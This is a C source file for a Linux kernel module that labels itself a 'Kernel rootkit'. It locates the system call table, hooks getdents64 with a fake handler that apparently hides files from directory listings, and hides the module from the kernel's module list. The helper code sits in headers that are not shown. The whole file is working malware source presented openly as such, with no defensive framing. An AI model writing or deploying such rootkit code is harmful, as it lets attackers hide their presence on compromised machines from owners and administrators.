
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <asm/unistd_64.h>

#include "hooker.h"
#include "fake_syscalls.h"
#include "module_hiding.h"

static int __init init_rootkit(void)
{
    sys_call_ptr_t *sys_call_table = (sys_call_ptr_t *)kallsyms_lookup_name("sys_call_table");

    if (!sys_call_table)
        return -1;

    set_sys_call_table_addr(sys_call_table);
    
    hook_syscall(__NR_getdents64, sys_getdents64_fake);

    hide_module(THIS_MODULE);

    return 0;
}

static void __exit cleanup_rootkit(void)
{
    unhook_all();
}

module_init(init_rootkit);
module_exit(cleanup_rootkit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pedro Peck");
MODULE_DESCRIPTION("Kernel rootkit");
